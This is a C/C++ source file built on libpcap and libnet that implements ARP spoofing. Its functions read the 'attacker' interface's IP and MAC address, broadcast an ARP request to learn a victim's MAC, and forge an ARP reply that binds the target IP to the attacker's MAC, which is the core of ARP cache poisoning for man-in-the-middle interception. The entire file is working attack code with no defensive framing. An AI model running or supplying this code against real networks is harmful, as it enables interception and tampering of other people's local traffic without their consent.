#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <cstdio>
#include <pcap.h>
#include <libnet.h>

uint32_t ResolveAttackerIp(const char* dev) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR) failed");
        close(sock);
        return -1;
    }

    close(sock);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    return ipaddr->sin_addr.s_addr;
}

uint8_t* ResolveAttackerMac(const char* dev) {
    static uint8_t mac[6];
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return nullptr;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR) failed");
        close(sock);
        return nullptr;
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);

    return mac;
}

void PrintAttacker(uint8_t* mac, uint32_t ip) {
    printf("Attacker MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    printf("Attacker IP: %s\n", inet_ntoa(*(struct in_addr*)&ip));
}

bool SendArpRequest(pcap_t* handle, const char* dev, const char* senderIp, uint8_t* senderMac) {
    libnet_t *l;
    char errbuf[LIBNET_ERRBUF_SIZE];
    u_int32_t target_ip_addr, src_ip_addr;
    u_int8_t *src_mac_addr;
    struct libnet_ether_addr *src_mac_hw_addr;
    l = libnet_init(LIBNET_LINK, dev, errbuf);

    if (l == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        return false;
    }

    src_ip_addr = libnet_get_ipaddr4(l);
    src_mac_hw_addr = libnet_get_hwaddr(l);
    src_mac_addr = src_mac_hw_addr->ether_addr_octet;
    target_ip_addr = libnet_name2addr4(l, const_cast<char*>(senderIp), LIBNET_DONT_RESOLVE);

    libnet_autobuild_arp(ARPOP_REQUEST,
                         src_mac_addr,
                         (u_int8_t*)&src_ip_addr,
                         (u_int8_t*)"\x00\x00\x00\x00\x00\x00",
                         (u_int8_t*)&target_ip_addr,
                         l);

    libnet_autobuild_ethernet((u_int8_t*)"\xff\xff\xff\xff\xff\xff",
                              ETHERTYPE_ARP,
                              l);

    if (libnet_write(l) == -1) {
        fprintf(stderr, "Send failed: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        return false;
    }

    libnet_destroy(l);
    return true;
}

bool SendArpReply(pcap_t* handle, uint8_t* attackerMac, const char* senderIp, uint8_t* senderMac, const char* targetIp) {
    libnet_t *l;
    char errbuf[LIBNET_ERRBUF_SIZE];
    u_int32_t src_ip_addr, target_ip_addr;
    l = libnet_init(LIBNET_LINK, nullptr, errbuf);

    if (l == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        return false;
    }

    src_ip_addr = libnet_name2addr4(l, const_cast<char*>(targetIp), LIBNET_DONT_RESOLVE);
    target_ip_addr = libnet_name2addr4(l, const_cast<char*>(senderIp), LIBNET_DONT_RESOLVE);

    libnet_autobuild_arp(ARPOP_REPLY,
                         attackerMac,
                         (u_int8_t*)&src_ip_addr,
                         senderMac,
                         (u_int8_t*)&target_ip_addr,
                         l);

    libnet_autobuild_ethernet(senderMac,
                              ETHERTYPE_ARP,
                              l);

    if (libnet_write(l) == -1) {
        fprintf(stderr, "Send failed: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        return false;
    }

    libnet_destroy(l);
    return true;
}

